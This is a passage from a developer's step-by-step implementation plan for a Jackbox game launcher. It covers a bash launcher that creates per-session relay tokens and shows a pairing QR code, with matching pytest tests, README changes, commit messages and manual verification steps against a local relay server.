    token's value.
    """
    sinks = [RoomCodeServer(port=38469)]
    values = {name: os.environ.get(name, "") for name in RELAY_VARIABLES}
    present = [name for name, value in values.items() if value]
    missing = [name for name, value in values.items() if not value]
    if present and missing:
        logger.warning(
            "%s relay publishing is disabled and the room code stays LAN-only: "
            "%s is set but %s is not.",
            LOG_MARKER,
            ", ".join(present),
            ", ".join(missing),
        )
    elif not missing:
        try:
            sinks.append(
                RelayPublisher(
                    values["JBVIP_RELAY_URL"],
                    values["JBVIP_SESSION_ID"],
                    values["JBVIP_SESSION_TOKEN"],
                )
            )
        except ValueError as exc:
            logger.error("%s publishing disabled: %s", LOG_MARKER, exc)
    return sinks
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `.venv/bin/python -m pytest -q` — the whole suite green.

- [ ] **Step 6: Commit**

```bash
git add extractor/relay_publisher.py extractor/addon.py \
        tests/test_relay_publisher.py tests/test_addon.py tests/test_relay_app.py
git commit -m "feat(extractor): publish into a specific relay session

Adds the session id to the publish URL and teaches the publisher which
failures are permanent. A gone session latches after one attempt and one
log line: Blobcast calls set_code once per websocket frame, and a failed
publish is deliberately not recorded as sent, so without the latch a dead
session retries and logs at frame rate for the whole game."
```

---

### Task 6: launcher, documentation, and the last of the deletions

Spec §5.7 and §10. Wiring — but the launcher part has two traps worth reading twice.

**Files:**
- Modify: `jbvip-run.sh`
- Modify: `tests/test_launcher.py`
- Modify: `relay/README.md`, `README.md`

**Interfaces:**
- Consumes: `python3 -m host.qr_window --base-url … --session-env …` (Task 4) and `python3 -m host.session --delete` (Task 3), plus the three environment variables from Task 5.
- Produces: nothing further.

**Two traps:**

1. **`set -euo pipefail` is on.** `python3 -m host.qr_window` exiting non-zero is the *designed* signal that the relay is unreachable — but a bare invocation would abort the script and the game would never launch, which is precisely the failure spec §8 forbids. It **must** sit in an `if` condition, where errexit does not apply. (Verified: a failing `if` condition does not exit under `set -e`, and neither does the left-hand side of an `&&` list, which is why the existing `[ -r "$RELAY_ENV" ] && . "$RELAY_ENV"` is already safe.)
2. **The session credentials must not be exported.** `bwrap -- "$@"` runs proprietary third-party game code; it has no business holding a token that can publish to the session. Keep them as plain shell variables and pass them as a prefix on the `mitmdump` line only. (This is a real improvement on today's behaviour, where the game inherits the long-lived `JBVIP_RELAY_TOKEN`.)

- [ ] **Step 1: Write the failing launcher tests**

Rewrite the top of `tests/test_launcher.py`. `_BLOCK_END` changes because `export JBVIP_RELAY_TOKEN=` ceases to exist, and `run_block` now reads the variable in the *same* shell, because the config block no longer exports anything.

```python
_BLOCK_START = "RELAY_ENV="
_BLOCK_END = 'JBVIP_RELAY_URL="${JBVIP_RELAY_URL:-}"'


def run_block(home: Path, env=None) -> str:
    """Run the block under the launcher's own shell options and report the URL."""
    script = (
        "set -euo pipefail\n"
        + relay_config_block()
        + '\nprintf "%s\\n" "${JBVIP_RELAY_URL-UNSET}"\n'
    )
    child_env = {"HOME": str(home), "PATH": "/usr/bin:/bin"}
    child_env.update(env or {})
    done = subprocess.run(
        ["bash", "-c", script], capture_output=True, text=True,
        env=child_env, cwd=str(REPO),
    )
    assert done.returncode == 0, done.stderr
    return done.stdout.splitlines()[0]


def test_the_launcher_reads_the_relay_url_from_the_config_file(tmp_path):
    config = tmp_path / ".config" / "jbvip"
    config.mkdir(parents=True)
    (config / "relay.env").write_text("JBVIP_RELAY_URL=https://sourced.example\n")
    assert run_block(tmp_path) == "https://sourced.example"


def test_the_config_file_honours_xdg_config_home(tmp_path):
    config = tmp_path / "xdg" / "jbvip"
    config.mkdir(parents=True)
    (config / "relay.env").write_text("JBVIP_RELAY_URL=https://xdg.example\n")
    assert run_block(
        tmp_path, env={"XDG_CONFIG_HOME": str(tmp_path / "xdg")}
    ) == "https://xdg.example"


def test_a_missing_config_file_leaves_the_url_empty(tmp_path):
    # Empty rather than unset: jbvip-run.sh runs under `set -u`.
    assert run_block(tmp_path) == ""


def test_a_real_environment_variable_still_works_without_a_config_file(tmp_path):
    # A directly-invoked run (not via Steam) can still be configured by export.
    assert run_block(
        tmp_path, env={"JBVIP_RELAY_URL": "https://env.example"}
    ) == "https://env.example"


def test_the_config_file_no_longer_carries_a_pre_shared_secret():
    # Every credential is now minted per session at launch and dies with it.
    text = LAUNCHER.read_text()
    assert "JBVIP_RELAY_TOKEN" not in text
    assert "JBVIP_PUBLISHER_TOKEN" not in text
```

Replace `mitmdump_flow_detail_args`'s line lookup with a shared helper, because the `mitmdump` invocation now begins with an environment prefix rather than the word `mitmdump`:

```python
def mitmdump_line() -> str:
    """The launcher's real mitmdump invocation, line continuations joined."""
    text = LAUNCHER.read_text().replace("\\\n", " ")
    return next(
        one for one in text.splitlines() if "mitmdump --mode transparent" in one
    )
```

and inside `mitmdump_flow_detail_args()` use `tokens = shlex.split(mitmdump_line().split(">", 1)[0])`, dropping the old `next(...startswith("mitmdump "))` lookup.

Add:

```python
def test_the_session_credentials_reach_mitmdump_but_not_the_game():
    # bwrap runs proprietary third-party game code. It has no business
    # holding a token that can publish to the relay session.
    line = mitmdump_line()
    for name in ("JBVIP_RELAY_URL", "JBVIP_SESSION_ID", "JBVIP_SESSION_TOKEN"):
        assert f"{name}=" in line
    text = LAUNCHER.read_text()
    assert "export JBVIP_SESSION_TOKEN" not in text
    assert "export JBVIP_SESSION_ID" not in text


def test_a_relay_that_cannot_be_reached_does_not_abort_the_launch():
    # set -e plus a bare `python3 -m host.qr_window` would end the script on a
    # dead VPS and the game would never start. It has to be an if-condition.
    text = LAUNCHER.read_text().replace("\\\n", " ")
    launch = next(
        one for one in text.splitlines() if "host.qr_window" in one
    )
    assert launch.strip().startswith("if "), launch


def test_the_launcher_deletes_its_session_on_the_way_out():
    text = LAUNCHER.read_text()
    assert "host.session --delete" in text
    # Before $STATE is removed, and never allowed to fail the trap.
    cleanup = text[text.index("cleanup() {"):text.index("trap cleanup")]
    assert cleanup.index("host.session --delete") < cleanup.index('rm -rf "$STATE"')
    assert "|| true" in cleanup
```

Change the README parametrisation to the one surviving variable:

```python
@pytest.mark.parametrize("variable", ["JBVIP_RELAY_URL"])
def test_the_readme_does_not_tell_the_user_to_export_the_relay_variables(variable):
```

- [ ] **Step 2: Modify `jbvip-run.sh`**

Replace the relay-config block (currently lines 24–32) with:

```bash
# Optional relay config. Steam launch options inherit the Steam client's
# environment, not a shell's, so a terminal `export` would never reach us.
# Only a URL now — every credential is minted per session at launch and dies
# with it, so there is no pre-shared secret on this machine any more.
RELAY_ENV="${XDG_CONFIG_HOME:-$HOME/.config}/jbvip/relay.env"
# shellcheck source=/dev/null
[ -r "$RELAY_ENV" ] && . "$RELAY_ENV"
# Normalise unset to empty so `set -u` stays safe, and so a run invoked directly
# from a shell (rather than by Steam) still honours a real environment variable.
JBVIP_RELAY_URL="${JBVIP_RELAY_URL:-}"
```

Add the session block **after** the `trap cleanup EXIT INT TERM` line (so cleanup can already delete whatever it creates) and **before** the `mitmdump` invocation:

```bash
# --- pair a phone, if a relay is configured ---------------------------------
# Deliberately before mitmdump and the game: fighting a fullscreen game for
# stacking order under Wayland is unreliable, and there is a natural gap here.
# Not exported — see the mitmdump line below.
SESSION_ID=""
SESSION_TOKEN=""
SESSION_ENV="$STATE/session.env"
if [ -n "$JBVIP_RELAY_URL" ]; then
  # The `if` matters: this exits non-zero when the relay is unreachable, and
  # under `set -e` a bare call would end the script and the game would never
  # launch. A dead VPS must never cost a game night.
  if python3 -m host.qr_window --base-url "$JBVIP_RELAY_URL" \
       --session-env "$SESSION_ENV"; then
    if [ -r "$SESSION_ENV" ]; then
      # shellcheck source=/dev/null
      . "$SESSION_ENV"
      SESSION_ID="${JBVIP_SESSION_ID:-}"
      SESSION_TOKEN="${JBVIP_SESSION_TOKEN:-}"
      unset JBVIP_SESSION_ID JBVIP_SESSION_TOKEN
    fi
  else
    echo "jbvip: no relay session; the room code stays LAN-only" >&2
  fi
fi
```

Prefix the `mitmdump` invocation so only it sees the credentials:

```bash
JBVIP_RELAY_URL="$JBVIP_RELAY_URL" \
JBVIP_SESSION_ID="$SESSION_ID" \
JBVIP_SESSION_TOKEN="$SESSION_TOKEN" \
mitmdump --mode transparent --listen-port "$PORT" --flow-detail 1 \
  -s "$REPO/extractor/addon.py" \
  >"$STATE/mitm.log" 2>&1 &
```

Keep the long comment above that invocation about `--flow-detail` verbatim — it documents a real trap and `tests/test_launcher.py` asserts the behaviour it describes.

Add to the **top** of `cleanup()`, before the log handling and well before `rm -rf "$STATE"`:

```bash
  # Free the session immediately rather than waiting four hours for it to
  # expire. `${SESSION_ID:-}` because the trap can fire before that line ran.
  if [ -n "${SESSION_ID:-}" ]; then
    JBVIP_RELAY_URL="$JBVIP_RELAY_URL" \
    JBVIP_SESSION_ID="$SESSION_ID" \
    JBVIP_SESSION_TOKEN="$SESSION_TOKEN" \
      python3 -m host.session --delete >/dev/null 2>&1 || true
  fi
```

- [ ] **Step 3: Run the tests to verify they pass**

Run: `.venv/bin/python -m pytest tests/test_launcher.py -q` then the whole suite.

- [ ] **Step 4: Check the shell script itself**

```bash
shellcheck jbvip-run.sh || true
bash -n jbvip-run.sh
```

`bash -n` must be clean. `shellcheck` may not be installed; if it is, treat SC2086-class warnings on the new lines as real.

- [ ] **Step 5: Rewrite the relay documentation**

`relay/README.md` — **delete** the "Configure" section (the publisher token, `/etc/jbvip/relay.env`), the "Revoking a subscriber" section, the "If pairing appears to work but does not stick" section, and `EnvironmentFile=`/`StateDirectory=`/`StateDirectoryMode=`/`Environment=JBVIP_TOKENS_FILE=` from the unit. The service now writes nothing at all, so `ProtectSystem=strict` needs no exception. **Add**:

- A note that the relay is a **public service**: anyone who can reach it can create a session, and that is intended.
- The new endpoint table (six rows, from Task 2's Produces block).
- Per-IP rate limiting belongs in the reverse proxy, which knows the true client IP; the relay caps only total resource use (spec §3). Give a concrete Caddy or nginx snippet if one is short.
- Capacity: 500 sessions, 16 subscribers each, 4-hour idle expiry — and that all of it is in memory, so a restart drops every session and connected phones must re-scan.
- Keep the **"Run exactly one worker"** section, strengthened: with sessions it is worse than before, because a phone and its host can now land on different workers and neither sees an error.
- Keep the freshness section unchanged.

`README.md` — rewrite the relay section (around lines 110–146):

```bash
mkdir -p ~/.config/jbvip
cat > ~/.config/jbvip/relay.env <<'EOF'
JBVIP_RELAY_URL=https://your-relay.example
EOF
chmod 600 ~/.config/jbvip/relay.env
```

State plainly: there is **no token to configure any more** — the launcher creates a session at each launch and it dies when the game exits. Describe the flow (a QR window appears; scan it; the window closes on its own; Skip or wait 120s to start without a phone). Add `qrencode` to the host requirements. Delete the `pair.py` instructions entirely. Keep the `last-run.log` troubleshooting paragraph.

- [ ] **Step 6: Run the whole suite one more time and commit**

```bash
.venv/bin/python -m pytest -q
git add jbvip-run.sh tests/test_launcher.py relay/README.md README.md
git commit -m "feat(launcher): create a relay session and show its QR at launch

The host no longer stores a pre-shared secret: relay.env holds only a URL,
and the per-session tokens are minted at launch, live in a mode-600 file in
the private run directory, and are deleted on exit. They are passed to
mitmdump alone rather than exported, so the game process never sees them.
A relay that cannot be reached logs and the game launches LAN-only."
```

---

## Verification

Run after Task 6, in order.

**1. The suite.** `.venv/bin/python -m pytest -q` — everything green. Report the final count; it is not predictable from the baseline and should not be forced to match a target.

**2. The relay, by hand.** Two sessions, proving isolation over real sockets:

```bash
.venv/bin/uvicorn --factory relay.app:create_app --host 127.0.0.1 --port 8479 &
A=$(curl -sS -X POST localhost:8479/sessions)
B=$(curl -sS -X POST localhost:8479/sessions)
AID=$(echo "$A" | .venv/bin/python -c 'import json,sys; print(json.load(sys.stdin)["session_id"])')
ASUB=$(echo "$A" | .venv/bin/python -c 'import json,sys; print(json.load(sys.stdin)["subscriber_token"])')
APUB=$(echo "$A" | .venv/bin/python -c 'import json,sys; print(json.load(sys.stdin)["publisher_token"])')
BID=$(echo "$B" | .venv/bin/python -c 'import json,sys; print(json.load(sys.stdin)["session_id"])')
BSUB=$(echo "$B" | .venv/bin/python -c 'import json,sys; print(json.load(sys.stdin)["subscriber_token"])')

curl -sS -N -H "Authorization: Bearer $ASUB" localhost:8479/sessions/$AID/subscribe &
curl -sS -N -H "Authorization: Bearer $BSUB" localhost:8479/sessions/$BID/subscribe &
sleep 1
curl -sS -X POST -H "Authorization: Bearer $APUB" -H 'Content-Type: application/json' \
     -d '{"code":"WEWW"}' localhost:8479/sessions/$AID/publish
sleep 1
kill %2 %3 %1
```

Expected: exactly one `data: {"code": "WEWW", ...}` line, on A's stream. B's shows only keepalives. **If B receives it, stop — that is the bug this whole rework exists to prevent.**

**3. The launcher, dry.** With no relay configured, confirm nothing changed:

```bash
grep -c JBVIP_RELAY_TOKEN jbvip-run.sh   # expect 0
bash -n jbvip-run.sh
```

**4. The end-to-end run — needs the user, a deployed relay and a real Jackbox game.** This cannot be done from here and is the same gap `docs/superpowers/specs/2026-08-02-auto-join-known-deferred-issues.md` already records. Hand the user this checklist:

1. Deploy the relay per the rewritten `relay/README.md` and confirm `curl -X POST https://relay/sessions` returns JSON.
2. `echo 'JBVIP_RELAY_URL=https://relay' > ~/.config/jbvip/relay.env; chmod 600 ~/.config/jbvip/relay.env`
3. `sudo ./jbvip-redirect-up.sh`
4. Launch Party Pack 9 from Steam (the only installed pack wired to `jbvip-run.sh`).
5. The QR window should appear before the game. Scan it with a phone — it should open the `/j` page.
6. Because the Android app does not exist yet, stand in for it: `curl -N -H "Authorization: Bearer <subscriber-token from the fragment>" https://relay/sessions/<id>/subscribe` on any machine.
7. Start a room in the game. The room code should appear on that stream within a second or two.
8. Quit the game; `curl https://relay/sessions/<id>` should then fail — the launcher deleted the session.

## Notes for whoever executes this

- **Nothing here has been implemented.** Every code block is a proposal, and the tests are written first on purpose. If a test in this plan is wrong, fix the test and say so — do not bend the implementation to satisfy a bad assertion.
- **The 180-test baseline drops to 137 at Task 0** and climbs from there. Never assert a total.
- **`docs/superpowers/specs/2026-08-02-auto-join-known-deferred-issues.md`** records everything deliberately deferred on the previous branch. Read it before concluding something is a new bug.
- The Android app is a separate, unwritten plan. Its only contract with this work is the QR payload format and `GET /sessions/<id>/subscribe`.
